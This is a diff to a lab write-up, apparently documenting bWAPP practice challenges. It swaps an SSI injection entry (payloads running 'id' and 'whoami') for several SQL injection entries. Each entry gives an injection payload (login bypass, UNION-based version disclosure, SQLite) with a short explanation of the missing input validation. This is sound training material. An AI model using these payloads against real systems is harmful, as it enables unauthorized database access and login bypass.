@@ -131,9 +131,9 @@
 
 <br><br>
 
-<b>Vulnerability:</b> Server Side Includes(SSI) Injection
+<b>Vulnerability:</b> SQL Injection (GET/Search)
 
-<b>Payload:</b> ```<!--#exec cmd="id"-->```<br>```<!--#exec cmd="whoami"-->```
+<b>Payload:</b> ```' or 1=1#```
 
 <b>Screenshot:</b>
 
@@ -142,3 +142,105 @@
 
 <b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
 ![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(get-search)reason.png?raw=true)
+
+<br><br>
+
+<b>Vulnerability:</b> SQL Injection (GET/Select)
+
+<b>Payload:</b> ```and 1=0 union select 1,@@version,3,4,5,6,7```
+
+<b>Screenshot:</b>
+
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(get-select).png?raw=true)
+
+
+<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/sqlinjection(get-search)reason.png?raw=true)
+
+<br><br>
+
+<b>Vulnerability:</b> SQL Injection (POST/Search)
+
+<b>Payload:</b> ```and 1=0 union select 1,@@version,3,4,5,6,7```
+
+<b>Screenshot:</b>
+
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(post-search).png?raw=true)
+
+
+<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(post-search)-reason.png?raw=true)
+
+
+<br><br>
+
+<b>Vulnerability:</b> SQL Injection (POST/Select)
+
+<b>Payload:</b> ```and 1=0 union select 1,@@version,3,4,5,6,7--```
+
+<b>Screenshot:</b>
+
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(post-select.png?raw=true)
+
+
+<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(post-select)-reason.png?raw=true)
+
+
+
+<br><br>
+
+<b>Vulnerability:</b> SQL Injection (AJAX/JSON/JQuery)
+
+<b>Payload:</b> ```and 1=0 union select 1,@@version,3,4,5,6,7-- -```
+
+<b>Screenshot:</b>
+
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(ajax-json-jquery).png?raw=true)
+
+
+<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input used in SQL statement.<br>
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(ajax-json-jquery)-reason.png?raw=true)
+
+<br><br>
+
+<b>Vulnerability:</b> SQL Injection (Login Form/Hero)
+
+<b>Payload:</b> ```superhero' or 1=1#```
+
+<b>Screenshot:</b>
+
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(login-form-hero).png?raw=true)
+
+
+<b>Reason:</b> As you can see in the screenshot above, there is no input validation. So, the input for username used directly in SQL statement. It causes the query to return true for password check.<br>
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(login-form-hero)-reason.png?raw=true)
+
+<br><br>
+
+<b>Vulnerability:</b> SQL Injection (Login Form/User)
+
+<b>Payload:</b> ```' order by 9#```
+
+<b>Screenshot:</b>
+
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(login-form-user).png?raw=true)
+
+
+<b>Reason:</b> With the payload provided above, we proved that there is SQL Injection vulnerability. We can go further from that point. It is because of the query in the screenshot below.<br>
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(login-form-user)-reason.png?raw=true)
+
+<br><br>
+
+<b>Vulnerability:</b> SQL Injection (SQLite)
+
+<b>Payload:</b> ```'and 1=0 union select 1,sqlite_version(),3,4,5,6-- -```
+
+<b>Screenshot:</b>
+
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(sqlite).png?raw=true)
+
+
+<b>Reason:</b> As we can see in the screenshot, there is no input validation. The input provided by user used in the sql query directly.<br>
+![Alt text](https://github.com/metosun/vulnerable-web-applications/blob/main/bwapp/images/slqinjection(sqlite)-reason.png?raw=true)
+
